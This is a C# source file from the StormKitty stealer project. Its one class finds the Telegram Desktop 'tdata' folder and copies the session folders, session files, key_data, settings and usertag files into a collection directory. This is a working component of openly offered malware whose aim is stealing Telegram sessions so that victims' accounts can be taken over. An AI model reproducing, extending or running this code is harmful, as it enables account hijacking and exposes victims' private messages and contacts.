/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.IO;
using System.Diagnostics;
using StormKitty;

namespace Stealer
{
    internal sealed class Telegram
    {
 
        // Get tdata directory
        private static string GetTdata()
        {
            string TelegramDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
            Process[] TelegramProcesses = Process.GetProcessesByName("Telegram");
            
            if (TelegramProcesses.Length == 0)
                return TelegramDesktopPath;
            else
                return Path.Combine(
                    Path.GetDirectoryName(
                        ProcessList.ProcessExecutablePath(
                            TelegramProcesses[0])), "tdata");
        }

        public static bool GetTelegramSessions(string sSaveDir)
        {
            string TelegramDesktopPath = GetTdata();
            try
            {
                if (!Directory.Exists(TelegramDesktopPath))
                    return false;

                Directory.CreateDirectory(sSaveDir);

                // Get all directories
                string[] Directories = Directory.GetDirectories(TelegramDesktopPath);
                string[] Files = Directory.GetFiles(TelegramDesktopPath);

                // Copy directories
                foreach (string dir in Directories)
                {
                    string name = new DirectoryInfo(dir).Name;
                    if (name.Length == 16)
                    {
                        string copyTo = Path.Combine(sSaveDir, name);
                        Filemanager.CopyDirectory(dir, copyTo);
                    }
                }
                // Copy files
                foreach (string file in Files)
                {
                    FileInfo finfo = new FileInfo(file);
                    string name = finfo.Name;
                    string copyTo = Path.Combine(sSaveDir, name);
                    // Check file size
                    if (finfo.Length > 5120)
                        continue;
                    // Copy session files
                    if (name.EndsWith("s") && name.Length == 17)
                    {
                        finfo.CopyTo(copyTo);
                        continue;
                    }
                    // Copy required files
                    if (name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data"))
                        finfo.CopyTo(copyTo);
                }
                Counter.Telegram = true;
                return true;
            }
            catch { return false; }
        }
    }
}
